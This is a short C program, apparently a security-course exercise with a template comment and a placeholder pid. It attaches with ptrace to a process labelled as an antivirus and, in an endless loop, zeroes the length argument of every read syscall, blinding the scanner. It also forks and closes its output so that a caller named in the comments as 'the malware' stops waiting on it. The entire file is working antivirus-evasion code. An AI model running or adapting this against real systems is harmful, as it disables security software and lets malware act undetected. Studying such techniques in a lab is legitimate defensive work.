#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>


// the pid variable and its placeholder value 
int pid                    = 0x01234567;

int main(int argc, char **argv) {
    // Make the malware stop waiting for our output by forking a child process:
    if (fork() != 0) {
        // Kill the parent process so we stop waiting from the malware
        return 0;
    } else {
        // Close the output stream so we stop waiting from the malware
        fclose(stdout);
    }

    // The rest of your code goes here
    // attach to antivirus
    if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
    {
        perror("attach");
        return 1;
    }

    int status; 

    struct user_regs_struct regs;
    unsigned long syscall_type; 


    while(1)
    {
        // wait for next syscall
        ptrace(PTRACE_SYSCALL, pid, NULL, NULL);

        waitpid(pid, &status, 0);
        if(WIFEXITED(status))
            return 1; 

        // get registers at the time of the syscall
        ptrace(PTRACE_GETREGS, pid, 0, &regs);

        // get syscall type from eax 
        syscall_type = regs.orig_eax; 

        // check if it is the read syscall (=3)
        if(syscall_type == 3)
        {
            // if it's the read syscall - change the length input (which is in 
            // edx) to 0 and update the registers  
            regs.edx = 0; 
            ptrace(PTRACE_SETREGS, pid, 0, &regs);

        }
    }

    // detach from antivirus 
    if(ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1)
    {
        perror("detach");
        return 1;
    }

    return 0;
}
